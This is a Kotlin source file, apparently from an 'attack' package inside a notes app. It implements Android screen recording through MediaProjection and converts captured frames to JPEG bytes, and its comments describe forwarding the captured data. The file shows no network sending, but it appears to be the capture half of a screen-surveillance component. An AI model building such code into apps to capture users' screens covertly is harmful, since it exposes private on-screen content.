package org.fossify.notes.attack

import android.app.Activity
import android.content.Context
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.ByteArrayOutputStream

/**
 * 录屏数据回调接口
 * 注意：避免与 Android 系统的 ScreenCaptureCallback 混淆
 */
interface ScreenRecorderCallback {
    /**
     * 当接收到新的视频帧时调用
     * @param image 视频帧图像数据
     * @param width 宽度
     * @param height 高度
     */
    fun onFrameCaptured(image: Image, width: Int, height: Int)
    
    /**
     * 录屏开始
     */
    fun onRecordingStarted()
    
    /**
     * 录屏停止
     */
    fun onRecordingStopped()
    
    /**
     * 发生错误
     */
    fun onError(error: String)
}

/**
 * 屏幕录制器
 * 用于捕获屏幕内容并转发数据
 */
class ScreenRecorder(private val context: Context) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var callback: ScreenRecorderCallback? = null
    private var isRecording = false
    
    private val displayMetrics: DisplayMetrics by lazy {
        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val display = windowManager.defaultDisplay
        val metrics = DisplayMetrics()
        display.getRealMetrics(metrics)
        metrics
    }
    
    companion object {
        private const val TAG = "ScreenRecorder"
        private const val VIRTUAL_DISPLAY_NAME = "ScreenRecorder"
        private const val VIRTUAL_DISPLAY_DPI = 160
    }
    
    /**
     * 请求录屏权限
     * @param activity Activity
     * @param requestCode 请求码
     */
    fun requestPermission(activity: Activity, requestCode: Int) {
        val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        activity.startActivityForResult(captureIntent, requestCode)
        Log.i(TAG, "请求录屏权限")
    }
    
    /**
     * 开始录屏
     * @param resultCode Activity result code
     * @param data Intent data
     * @param callback 数据回调
     */
    fun startRecording(resultCode: Int, data: android.content.Intent, callback: ScreenRecorderCallback) {
        if (isRecording) {
            Log.w(TAG, "录屏已在进行中")
            return
        }
        
        this.callback = callback
        
        try {
            val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
            
            val width = displayMetrics.widthPixels
            val height = displayMetrics.heightPixels
            
            // 创建 ImageReader 来接收屏幕帧
            // 使用 RGB_565 格式，可以直接转换为 Bitmap 然后压缩为 JPEG
            // 如果 RGB_565 不支持，回退到 YUV_420_888
            imageReader = try {
                ImageReader.newInstance(width, height, android.graphics.ImageFormat.RGB_565, 2)
            } catch (e: Exception) {
                Log.w(TAG, "RGB_565 format not supported, trying YUV_420_888: ${e.message}")
                try {
                    ImageReader.newInstance(width, height, android.graphics.ImageFormat.YUV_420_888, 2)
                } catch (e2: Exception) {
                    Log.e(TAG, "YUV_420_888 format also not supported: ${e2.message}")
                    throw IllegalArgumentException("No supported image format available for screen recording", e2)
                }
            }
            
            // 设置图像监听器
            imageReader?.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    image?.let {
                        try {
                            callback.onFrameCaptured(it, width, height)
                        } catch (e: Exception) {
                            Log.e(TAG, "处理图像帧时出错: ${e.message}", e)
                            // 确保即使回调出错也关闭 image
                            it.close()
                        }
                        // 注意：image 应该在回调中关闭，如果没有关闭，这里确保关闭
                        // 但通常回调应该负责关闭
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "获取图像失败: ${e.message}", e)
                }
            }, null)
            
            // 必须先注册回调，然后才能创建 VirtualDisplay
            val projectionCallback = object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.i(TAG, "MediaProjection 已停止")
                    stopRecording()
                }
            }
            
            // 注册停止监听（必须在 createVirtualDisplay 之前）
            mediaProjection?.registerCallback(projectionCallback, null)
            
            // 创建虚拟显示
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                VIRTUAL_DISPLAY_NAME,
                width,
                height,
                VIRTUAL_DISPLAY_DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null,
                null
            )
            
            isRecording = true
            Log.i(TAG, "录屏已开始: ${width}x${height}")
            callback.onRecordingStarted()
            
        } catch (e: Exception) {
            Log.e(TAG, "开始录屏失败: ${e.message}", e)
            callback.onError("开始录屏失败: ${e.message}")
            isRecording = false
        }
    }
    
    /**
     * 停止录屏
     */
    fun stopRecording() {
        if (!isRecording) {
            return
        }
        
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            
            imageReader?.close()
            imageReader = null
            
            mediaProjection?.stop()
            mediaProjection = null
            
            isRecording = false
            Log.i(TAG, "录屏已停止")
            callback?.onRecordingStopped()
            
        } catch (e: Exception) {
            Log.e(TAG, "停止录屏失败: ${e.message}", e)
            callback?.onError("停止录屏失败: ${e.message}")
        } finally {
            callback = null
        }
    }
    
    /**
     * 检查是否正在录屏
     */
    fun isRecording(): Boolean = isRecording
    
    /**
     * 获取屏幕宽度
     */
    fun getScreenWidth(): Int = displayMetrics.widthPixels
    
    /**
     * 获取屏幕高度
     */
    fun getScreenHeight(): Int = displayMetrics.heightPixels
}

/**
 * 图像数据处理工具类
 */
object ImageProcessor {
    private const val TAG = "ImageProcessor"
    
    /**
     * 将 Image 转换为 JPEG 字节数组
     * @param image Image 对象
     * @param quality JPEG 压缩质量 (0-100)，默认 80
     * @return JPEG 字节数组，如果转换失败返回 null
     */
    fun imageToJpeg(image: Image, quality: Int = 80): ByteArray? {
        return try {
            val bitmap = imageToBitmap(image)
            bitmap?.let { bmp ->
                val outputStream = ByteArrayOutputStream()
                bmp.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
                val jpegBytes = outputStream.toByteArray()
                outputStream.close()
                jpegBytes
            }
        } catch (e: Exception) {
            Log.e(TAG, "转换为 JPEG 失败: ${e.message}", e)
            null
        } finally {
            image.close()
        }
    }
    
    /**
     * 将 Image 转换为 Bitmap
     */
    private fun imageToBitmap(image: Image): Bitmap? {
        return try {
            val format = image.format
            when (format) {
                ImageFormat.RGB_565 -> {
                    imageToBitmapFromRGB565(image)
                }
                ImageFormat.YUV_420_888 -> {
                    imageToBitmapFromYUV420888(image)
                }
                else -> {
                    Log.w(TAG, "不支持的图像格式: $format")
                    null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "转换为 Bitmap 失败: ${e.message}", e)
            null
        }
    }
    
    /**
     * 从 RGB_565 格式的 Image 转换为 Bitmap
     */
    private fun imageToBitmapFromRGB565(image: Image): Bitmap? {
        return try {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * image.width
            
            val bitmap = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.RGB_565)
            
            // 如果 rowStride 正好等于 width * pixelStride，可以直接复制
            if (rowPadding == 0 && pixelStride == 2) {
                val position = buffer.position()
                buffer.rewind()
                bitmap.copyPixelsFromBuffer(buffer)
                buffer.position(position)
            } else {
                // 需要处理行填充
                val pixels = ShortArray(image.width * image.height)
                var offset = 0
                var pixelIndex = 0
                
                for (y in 0 until image.height) {
                    for (x in 0 until image.width) {
                        pixels[pixelIndex++] = buffer.getShort(offset)
                        offset += pixelStride
                    }
                    offset += rowPadding
                }
                
                // 将 ShortArray 转换为像素数组
                val intPixels = IntArray(image.width * image.height)
                for (i in pixels.indices) {
                    val rgb565 = pixels[i].toInt() and 0xFFFF
                    val r = (rgb565 and 0xF800) shr 11
                    val g = (rgb565 and 0x7E0) shr 5
                    val b = rgb565 and 0x1F
                    // 转换为 ARGB_8888
                    intPixels[i] = (0xFF shl 24) or 
                                  ((r shl 3) shl 16) or 
                                  ((g shl 2) shl 8) or 
                                  (b shl 3)
                }
                
                bitmap.setPixels(intPixels, 0, image.width, 0, 0, image.width, image.height)
            }
            
            bitmap
        } catch (e: Exception) {
            Log.e(TAG, "从 RGB_565 转换失败: ${e.message}", e)
            null
        }
    }
    
    /**
     * 从 YUV_420_888 格式的 Image 转换为 Bitmap
     * 简化版本：只读取 Y 平面（灰度图）以提高性能
     */
    private fun imageToBitmapFromYUV420888(image: Image): Bitmap? {
        return try {
            val yPlane = image.planes[0]
            val yBuffer = yPlane.buffer
            val ySize = yBuffer.remaining()
            
            val yBytes = ByteArray(ySize)
            yBuffer.get(yBytes)
            
            // 将 Y 平面数据转换为 Bitmap（灰度图）
            val bitmap = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.ARGB_8888)
            val pixels = IntArray(image.width * image.height)
            
            for (i in yBytes.indices) {
                val y = yBytes[i].toInt() and 0xFF
                pixels[i] = (0xFF shl 24) or (y shl 16) or (y shl 8) or y // 灰度
            }
            
            bitmap.setPixels(pixels, 0, image.width, 0, 0, image.width, image.height)
            bitmap
        } catch (e: Exception) {
            Log.e(TAG, "从 YUV_420_888 转换失败: ${e.message}", e)
            null
        }
    }
    
    /**
     * 将 Image 转换为字节数组（RGBA格式）- 已废弃，使用 imageToJpeg
     */
    @Deprecated("使用 imageToJpeg 替代")
    fun imageToByteArray(image: Image): ByteArray? {
        return imageToJpeg(image)
    }
    
    /**
     * 将 Image 的 Plane 数据直接读取为字节数组（已废弃，使用 imageToJpeg）
     */
    @Deprecated("使用 imageToJpeg 替代")
    fun imageToByteArrayDirect(image: Image): ByteArray? {
        return imageToJpeg(image)
    }
}

